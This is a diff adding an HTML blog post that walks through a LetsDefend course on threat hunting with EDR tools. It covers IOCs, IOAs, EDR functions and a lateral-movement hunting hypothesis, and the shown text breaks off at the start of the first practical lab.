@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Threat Hunting with EDR Walkthrough — LetsDefend · Yusuf Talha ARABACI
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Yusuf Talha ARABACI">
+<meta name="description" content="
+
+  Threat Hunting with EDR Walkthrough — LetsDefend
+  
+    
+    Başlık Linki
+  
+
+
+LetsDefend — Blue Team Training Platform
+
+  Introduction
+  
+    
+    Başlık Linki
+  
+
+Threat hunting is a fundamental practice in modern cybersecurity strategies. It involves actively searching for potential security incidents and indicators of compromise (IOCs) that can evade traditional security measures. In this process, endpoint detection and response (EDR) tools play a critical role by providing security teams with the data and capabilities they need.">
+<meta name="keywords" content="cybersecurity, infosec, cloud-native security, soc architecture, open source defense, yusuf talha arabaci, malware analysis, pentesting">
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/images/profile.jpeg">
+  <meta name="twitter:title" content="Threat Hunting with EDR Walkthrough — LetsDefend">
+  <meta name="twitter:description" content="Threat Hunting with EDR Walkthrough — LetsDefendBaşlık LinkiLetsDefend — Blue Team Training Platform
+IntroductionBaşlık LinkiThreat hunting is a fundamental practice in modern cybersecurity strategies. It involves actively searching for potential security incidents and indicators of compromise (IOCs) that can evade traditional security measures. In this process, endpoint detection and response (EDR) tools play a critical role by providing security teams with the data and capabilities they need.">
+
+<meta property="og:url" content="http://localhost:1313/tr/posts/2025/10/threat-hunting-with-edr-walkthrough-letsdefend/">
+  <meta property="og:site_name" content="Yusuf Talha ARABACI">
+  <meta property="og:title" content="Threat Hunting with EDR Walkthrough — LetsDefend">
+  <meta property="og:description" content="Threat Hunting with EDR Walkthrough — LetsDefendBaşlık LinkiLetsDefend — Blue Team Training Platform
+IntroductionBaşlık LinkiThreat hunting is a fundamental practice in modern cybersecurity strategies. It involves actively searching for potential security incidents and indicators of compromise (IOCs) that can evade traditional security measures. In this process, endpoint detection and response (EDR) tools play a critical role by providing security teams with the data and capabilities they need.">
+  <meta property="og:locale" content="tr">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-10-29T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-29T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/images/profile.jpeg">
+      <meta property="og:see_also" content="http://localhost:1313/tr/posts/2025/10/threat-hunting-with-deception-walkthrough-letsdefend/">
+      <meta property="og:see_also" content="http://localhost:1313/tr/posts/2025/10/threat-hunting-with-email-security-walkthrough-letsdefend/">
+      <meta property="og:see_also" content="http://localhost:1313/tr/posts/2025/10/threat-hunting-with-dns-walkthrough-letsdefend/">
+      <meta property="og:see_also" content="http://localhost:1313/tr/posts/2025/10/threat-hunting-with-ips/ids-walkthrough-letsdefend/">
+      <meta property="og:see_also" content="http://localhost:1313/tr/posts/2025/10/threat-hunting-with-waf-walkthrough-letsdefend/">
+      <meta property="og:see_also" content="http://localhost:1313/tr/posts/2025/09/threat-hunting-with-cti-walkthrough-letsdefend/">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/tr/posts/2025/10/threat-hunting-with-edr-walkthrough-letsdefend/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.css" media="screen">
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/tr/">
+      Yusuf Talha ARABACI
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/posts/">Yazılar</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/series/">Seriler</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/about/">Hakkımda</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="/posts/2025/10/threat-hunting-with-edr-walkthrough-letsdefend/">English</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/tr/posts/2025/10/threat-hunting-with-edr-walkthrough-letsdefend/">
+              Threat Hunting with EDR Walkthrough — LetsDefend
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-10-29T00:00:00Z">
+                Ekim 29, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              16 dakikalık okuma
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <hr>
+<h3 id="threat-hunting-with-edr-walkthroughletsdefend">
+  Threat Hunting with EDR Walkthrough — LetsDefend
+  <a class="heading-link" href="#threat-hunting-with-edr-walkthroughletsdefend">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p><img src="/images/0_TWCVA6eqWDZwyV86.png" alt=""></p>
+<p><a href="https://letsdefend.io/"  class="external-link" target="_blank" rel="noopener">LetsDefend — Blue Team Training Platform</a></p>
+<h3 id="introduction">
+  Introduction
+  <a class="heading-link" href="#introduction">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Threat hunting is a fundamental practice in modern cybersecurity strategies. It involves actively searching for potential security incidents and indicators of compromise (IOCs) that can evade traditional security measures. In this process, endpoint detection and response (EDR) tools play a critical role by providing security teams with the data and capabilities they need.</p>
+<p>This course focuses on “Threat Hunting with EDR” and explores two key areas:</p>
+<ul>
+<li>The core function of EDR in threat hunting</li>
+<li>The importance of EDR data for threat hunting</li>
+</ul>
+<p>Understanding the use of EDR tools in the threat hunting process, and the role of the data provided by these tools in threat detection and analysis, will allow us to develop the capabilities to respond more effectively and quickly to security events.</p>
+<p><img src="/images/0_2g2VuJTQc2sxctnl.png" alt=""></p>
+<p>EDR tools can assist threat hunters in several ways. First, EDR tools provide rich and detailed data about your endpoints. You can use this data to create hypotheses, queries, and indicators of compromise (IOCs) for threat hunting. In addition, these tools allow you to instantly detect and analyze endpoint incidents, enabling you to respond quickly and effectively in the early stages of a cyber threat.</p>
+<p>The data provided by EDR tools plays a critical role in every phase of the threat hunting process. During the data collection and enrichment phase, EDR tools collect information from multiple sources (logs, file activity, network connections, system events, and user behavior) and enrich this information with threat intelligence and contextual data. This enriched data makes it possible to detect threats in a more comprehensive and contextual manner.</p>
+<p>This lesson has introduced the topic of Threat Hunting with EDR. The next lesson will cover “ <strong>Importance of EDR Data for Threat Hunting</strong> ”.</p>
+<h3 id="questions">
+  Questions
+  <a class="heading-link" href="#questions">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>No Anser Needed</p>
+<hr>
+<h3 id="importance-of-edr-data-for-threathunting">
+  Importance of EDR Data for Threat Hunting
+  <a class="heading-link" href="#importance-of-edr-data-for-threathunting">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>In the world of cybersecurity, accurate and comprehensive data is essential to detecting, monitoring, and preventing threats. Endpoint detection and response (EDR) tools provide security teams with this critical data by monitoring and analyzing endpoint activity in detail. EDR tools not only detect potential threats, but also help us understand how attacks occur and which systems are affected. The comprehensive data they offer makes threat hunting processes more effective and efficient, enabling faster and more accurate responses to cybersecurity incidents. In this lesson, we will discuss why the data provided by EDR tools is so important and its role in the threat hunting process.</p>
+<h3 id="data-collection">
+  Data Collection
+  <a class="heading-link" href="#data-collection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Various Data Sources</strong> : EDR tools collect a wide variety of data from endpoints, including logs, file activities, network connections, system events, and user behaviors.</li>
+<li><strong>Real-time Monitoring</strong> : EDR tools provide real-time monitoring to instantly detect events occurring on endpoints, allowing potential threats to be quickly identified.</li>
+</ul>
+<h3 id="data-enrichment">
+  Data Enrichment
+  <a class="heading-link" href="#data-enrichment">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Enhancing with Additional Information:</strong> They enrich the collected data with additional information such as threat intelligence, user information, and environmental data to make the data more meaningful.</li>
+<li><strong>Correlation:</strong> They establish relationships between different data points to obtain more comprehensive and contextual information. This makes it easier to detect threats.</li>
+</ul>
+<h3 id="data-analysis">
+  Data Analysis
+  <a class="heading-link" href="#data-analysis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<h3 id="big-data-analytics">
+  Big Data Analytics
+  <a class="heading-link" href="#big-data-analytics">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Data Collection:</strong> EDR tools collect large amounts of data from endpoints and store this data in a centralized location.</li>
+<li><strong>Rapid and Effective Analysis:</strong> EDR Tools analyze collected data in a short time and effectively use big data analytics techniques, enabling faster threat detection.</li>
+<li><strong>Pattern Recognition:</strong> EDR tools use machine learning algorithms to detect abnormal patterns and behaviors in datasets.</li>
+</ul>
+<h3 id="machine-learning-andai">
+  Machine Learning and AI
+  <a class="heading-link" href="#machine-learning-andai">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Behavioral Modeling:</strong> Machine learning algorithms model user and system behaviors to distinguish between normal and abnormal activities.</li>
+<li><strong>Predictive Analysis:</strong> Artificial intelligence is used to predict future threats based on historical data. This enables proactive threat hunting.</li>
+<li><strong>Anomaly Detection:</strong> Deviations from normal behaviors are identified, allowing potential threats to be detected at an early stage.</li>
+</ul>
+<h3 id="visualization">
+  Visualization
+  <a class="heading-link" href="#visualization">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<h3 id="data-visualization-techniques">
+  Data Visualization Techniques
+  <a class="heading-link" href="#data-visualization-techniques">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Graphs and Tables:</strong> Graphs and tables are used to make complex datasets more understandable, and helps security teams quickly interpret the data.</li>
+<li><strong>Relationship Maps:</strong> Maps that visually represent relationships between different event types show the spread and interactions of threats.</li>
+<li><strong>Heatmaps:</strong> Heatmaps visually display the intensity of different event types, providing important clues for threat hunting.</li>
+</ul>
+<h3 id="timelines">
+  Timelines
+  <a class="heading-link" href="#timelines">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Chronological Order of Events:</strong> Timelines of security events help understand how and when threats occurred.</li>
+<li><strong>Threat Processes:</strong> Visualizing the various stages of attacks improves understanding of threats and enhances response processes.</li>
+</ul>
+<h3 id="use-of-ioc-andioa">
+  Use of IOC and IOA
+  <a class="heading-link" href="#use-of-ioc-andioa">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>In the threat hunting process, the search for indicators of compromise (IOC) and indicators of attack (IOA) are important techniques used by cybersecurity professionals to identify potential threats and malicious activity. The effective use of IOCs and IOAs is critical to the early detection and prevention of cyber threats.</p>
+<p><img src="/images/0_-kQ4N2K7do1yVkjE.png" alt=""></p>
+<p>( <strong>Image Source</strong> : <a href="https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/"  class="external-link" target="_blank" rel="noopener">https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/</a> )</p>
+<h3 id="ioc-indicators-of-compromise">
+  IOC (Indicators of Compromise)
+  <a class="heading-link" href="#ioc-indicators-of-compromise">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>IOCs are specific indicators of a security breach or data leak. These indicators point to malicious activities occurring on a specific system or network.</p>
+<p><strong>Examples:</strong> Malicious file hashes, suspicious IP addresses, abnormal file paths, unknown or suspicious domains.</p>
+<h3 id="hunting-foriocs">
+  Hunting for IOCs
+  <a class="heading-link" href="#hunting-foriocs">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Data Collection:</strong> EDR tools continuously collect data from endpoints and networks. This data originates from various sources such as logs, file activities, and network traffic.</li>
+<li><strong>IOC Detection:</strong> Collected data is compared with known IOCs. This comparison triggers alerts when malware or suspicious activities are detected.</li>
+<li><strong>Analysis:</strong> Detected IOCs are analyzed in detail by cybersecurity experts. This analysis determines the source and spread methods of the threat.</li>
+</ul>
+<h3 id="use-ofiocs">
+  Use of IOCs
+  <a class="heading-link" href="#use-ofiocs">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Quick Identification:</strong> Known IOCs enable the rapid detection of identified threats. This allows for quick responses to security breaches.</li>
+<li><strong>Database Updates:</strong> EDR tools continuously update IOC databases. These updates ensure that new threats are quickly recognized.</li>
+</ul>
+<h3 id="ioa-indicators-ofattack">
+  IOA (Indicators of Attack)
+  <a class="heading-link" href="#ioa-indicators-ofattack">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>IOAs are behavioral indicators that specify the intent or methodology of an attack. IOAs provide information about how attacks are carried out and the goals of attackers.</p>
+<p><strong>Examples:</strong> Attempts to delete files, unauthorized access attempts, compromised user accounts, system configuration changes.</p>
+<h3 id="hunting-forioas">
+  Hunting for IOAs
+  <a class="heading-link" href="#hunting-forioas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Behavioral Analysis:</strong> EDR tools continuously monitor and analyze activities on endpoints and networks. This analysis identifies deviations from normal behavior patterns.</li>
+<li><strong>Anomaly Detection:</strong> EDR tools use machine learning and artificial intelligence algorithms to detect abnormal activities and behaviors.</li>
+<li><strong>IOA Detection:</strong> When compared to known IOAs, it increases the chances of detecting abnormal behavior as a potential attack.</li>
+</ul>
+<h3 id="use-ofioas">
+  Use of IOAs
+  <a class="heading-link" href="#use-ofioas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Determining Attack Intent:</strong> IOAs help determine the intent and methodology of attacks, providing insight into the goals of attackers.</li>
+<li><strong>Proactive Defense:</strong> IOAs enable the detection of threats at an early stage. This allows preventive measures to be taken before attacks occur.</li>
+<li><strong>Advanced Threat Hunting:</strong> IOAs are effective not only in detecting known threats but also in identifying new and emerging threats. This enables cybersecurity experts to conduct more comprehensive and effective threat hunting.</li>
+</ul>
+<h3 id="conclusion">
+  Conclusion
+  <a class="heading-link" href="#conclusion">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>This lesson explained why the data provided by EDR tools is so important and its role in the threat hunting process. By covering data collection and enrichment, data analysis and visualization, IOC and IOA usage, and data security and privacy, the importance of EDR tools in the cybersecurity ecosystem has been emphasized.</p>
+<p>This lesson has emphasized the importance of EDR data in the threat hunting process. The next lesson will cover <strong>“Core Functions of EDR in Threat Hunting”.</strong></p>
+<h3 id="questions-1">
+  Questions
+  <a class="heading-link" href="#questions-1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>No Anser Needed</p>
+<hr>
+<h3 id="core-functions-of-edr-in-threathunting">
+  Core Functions of EDR in Threat Hunting
+  <a class="heading-link" href="#core-functions-of-edr-in-threathunting">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>In the threat hunting process, endpoint detection and response (EDR) solutions detect, investigate, respond to, and recover from threats, enabling security teams to quickly and effectively detect, analyze, and respond to potential threats. The threat hunting process becomes more effective and efficient with EDR tools’ comprehensive data collection, enrichment, analysis, and visualization features.</p>
+<h3 id="threat-detection">
+  Threat Detection
+  <a class="heading-link" href="#threat-detection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<h3 id="anomaly-and-behavioral-detection">
+  Anomaly and Behavioral Detection
+  <a class="heading-link" href="#anomaly-and-behavioral-detection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>EDR tools continuously monitor activities on endpoints and analyze whether these activities deviate from normal behavior. For example, a particular user or device logging in at unusual times, unexpected file changes, or new software suddenly running can all be considered anomalous behavior.</p>
+<p>They use anomaly detection algorithms to identify non-standard or suspicious activities. These anomalies may indicate potential threats and require further investigation.</p>
+<h3 id="threat-intelligence-integration">
+  Threat Intelligence Integration
+  <a class="heading-link" href="#threat-intelligence-integration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>EDR tools integrate with up-to-date threat intelligence databases to track known malware, IP addresses, and other Indicators of Compromise (IOCs) enabling rapid detection of previously identified threats.</p>
+<p>Real-time monitoring capabilities empower analysts to immediately identify threats and intervene in the early stages of attacks.</p>
+<h3 id="investigation">
+  Investigation
+  <a class="heading-link" href="#investigation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<h3 id="event-correlation-andanalysis">
+  Event Correlation and Analysis
+  <a class="heading-link" href="#event-correlation-andanalysis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Data Correlation</strong>: EDR (Endpoint Detection and Response) tools consolidate and correlate information from various data sources so that the users can have a better understanding of how attacks were carried out and which systems were affected.</li>
+<li><strong>Digital Forensic Analysis</strong>: EDR tools collect and analyze detailed data for post-incident investigations. This process helps identify the attack’s origin, the methods used, and the attacker’s traces.</li>
+</ul>
+<h3 id="incident-investigation-tools">
+  Incident Investigation Tools
+  <a class="heading-link" href="#incident-investigation-tools">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Timeline Creation:</strong> EDR tools create timelines of events, clarifying the stages and timing of an attack.</li>
+<li><strong>File and Memory Analysis:</strong> EDR tools analyze suspicious file and memory activities to trace malware and uncover potential threats.</li>
+</ul>
+<h3 id="response">
+  Response
+  <a class="heading-link" href="#response">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<h3 id="incident-response-and-isolation">
+  Incident Response and Isolation
+  <a class="heading-link" href="#incident-response-and-isolation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Device Isolation</strong>: When suspicious activities are detected, EDR tools can isolate affected devices from the network. This is a critical step to prevent the attack from spreading.</li>
+<li><strong>Rapid Response</strong>: EDR tools use automated response mechanisms to quickly address threats. It includes actions such as stopping malware or blocking abnormal network traffic.</li>
+<li><strong>Automated Response Mechanism</strong>: EDR tools are equipped with the ability to automatically respond to specific threats. For example, if a suspicious file is detected, it can be automatically quarantined, or a specific process can be terminated.</li>
+</ul>
+<h3 id="quarantine-and-remediation">
+  Quarantine and Remediation
+  <a class="heading-link" href="#quarantine-and-remediation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Quarantine:</strong> EDR tools quarantine malicious files or processes to prevent further spread.</li>
+<li><strong>Remediation Steps:</strong> EDR tools recommend and implement necessary remediation steps to neutralize threats.</li>
+</ul>
+<h3 id="recovery">
+  Recovery
+  <a class="heading-link" href="#recovery">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<h3 id="system-and-datarecovery">
+  System and Data Recovery
+  <a class="heading-link" href="#system-and-datarecovery">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Backup and Restore:</strong> EDR tools ensure that systems and data are restored from secure backups after an attack. This process is critical for maintaining business continuity.</li>
+<li><strong>Patch Application:</strong> EDR tools identify the source of the attack and vulnerabilities, ensuring that necessary patches and updates are applied, which helps prevent similar attacks in the future.</li>
+</ul>
+<p>This lesson has discussed the core functions of EDR and their importance in the threat hunting process. The next lesson will cover “<strong>Lateral Movement and Internal Threat Hypothesis</strong>”.</p>
+<h3 id="questions-2">
+  Questions
+  <a class="heading-link" href="#questions-2">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>No Anser Needed</p>
+<hr>
+<h3 id="lateral-movement-and-internal-threat-hypothesis">
+  Lateral Movement and Internal Threat Hypothesis
+  <a class="heading-link" href="#lateral-movement-and-internal-threat-hypothesis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<h3 id="hypothesis">
+  Hypothesis
+  <a class="heading-link" href="#hypothesis">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>A threat actor may be in the process of lateral movement across the internal network in order to have access to other parts of the network.</p>
+<p><img src="/images/0_LTJQJg6-Nsk5rKMV.png" alt=""></p>
+<p>( <strong>Image Source</strong> : <a href="https://www.microsoft.com/en-us/security/blog/2020/06/10/the-science-behind-microsoft-threat-protection-attack-modeling-for-finding-and-stopping-evasive-ransomware/"  class="external-link" target="_blank" rel="noopener">https://www.microsoft.com/en-us/security/blog/2020/06/10/the-science-behind-microsoft-threat-protection-attack-modeling-for-finding-and-stopping-evasive-ransomware/</a> )</p>
+<h3 id="data-sources">
+  Data Sources
+  <a class="heading-link" href="#data-sources">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>EDR Logs</strong> : Records of abnormal activities on endpoints.</li>
+<li><strong>Network Traffic Logs</strong> : Records of connections between devices within the internal network.</li>
+<li><strong>IDS/IPS Logs</strong> : Records of potential attack activities within the internal network.</li>
+</ul>
+<h3 id="analysis-steps">
+  Analysis Steps
+  <a class="heading-link" href="#analysis-steps">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Endpoint Activities:</strong> Monitor abnormal process or file activities on endpoints.</li>
+<li><strong>Antivirus Alerts:</strong> Investigate malware detected by antivirus software.</li>
+<li><strong>Malicious Code Execution:</strong> Detect suspicious code execution activities.</li>
+<li><strong>Connection Attempts:</strong> Monitor increased connection attempts between devices within the internal network.</li>
+<li><strong>Access to New Devices:</strong> Check connections from a specific device to other internal network devices it has not accessed before.</li>
+<li><strong>Unexpected Protocols:</strong> Investigate abnormal connections over protocols such as SMB (Server Message Block) or RDP (Remote Desktop Protocol).</li>
+<li><strong>Port Scans:</strong> Examine port scanning activities or unexpected connections over unusual ports within the internal network.</li>
+<li><strong>IDS/IPS Alerts:</strong> Review alerts for potential attack activities within the internal network.</li>
+<li><strong>Anomaly Detection:</strong> Examine IDS/IPS alerts that identify deviations from normal behavior patterns.</li>
+</ul>
+<p><img src="/images/0_vfo-eoQV2WUiKOv-.png" alt=""></p>
+<p>( <strong>Image Source</strong> : <a href="https://www.microsoft.com/en-us/security/blog/2020/06/10/the-science-behind-microsoft-threat-protection-attack-modeling-for-finding-and-stopping-evasive-ransomware/"  class="external-link" target="_blank" rel="noopener">https://www.microsoft.com/en-us/security/blog/2020/06/10/the-science-behind-microsoft-threat-protection-attack-modeling-for-finding-and-stopping-evasive-ransomware/</a> )</p>
+<h3 id="expected-outcomes">
+  Expected Outcomes
+  <a class="heading-link" href="#expected-outcomes">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li>Abnormal process or file activities on endpoints.</li>
+<li>Increased connection attempts between different devices.</li>
+<li>Potential attack activities and IDS/IPS alerts within the internal network.</li>
+</ul>
+<h3 id="summary">
+  Summary
+  <a class="heading-link" href="#summary">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>EDR systems provide powerful tools for detecting and managing internal threats during the threat hunting process. To detect a threat actor attempting to spread through lateral movement, following the steps outlined above is critical for ensuring network security. This process helps organizations proactively manage their cybersecurity posture and become more resilient against potential threats. During the threat hunting process, EDR solutions enable more effective monitoring of threat actor behavior, allowing anomalies to be quickly detected and addressed.</p>
+<h3 id="questions-3">
+  Questions
+  <a class="heading-link" href="#questions-3">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>No Anser Needed</p>
+<hr>
+<h3 id="practical-lab-1">
+  Practical Lab-1
+  <a class="heading-link" href="#practical-lab-1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<h3 id="hypothesis-1">
+  Hypothesis-1
+  <a class="heading-link" href="#hypothesis-1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p><strong>Note</strong>: The following questions are provided for the threat hunting process to test the following hypothesis.</p>
+<p><strong>Hypothesis</strong>: A group of threat actors may be distributing malware to conduct cryptocurrency mining on our systems. This malware could be secretly utilizing our system resources for crypto-mining operations.</p>
+<h3 id="threat-hunting-lab-environment">
+  Threat Hunting Lab Environment
+  <a class="heading-link" href="#threat-hunting-lab-environment">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li>SIEM (Wazuh)</li>
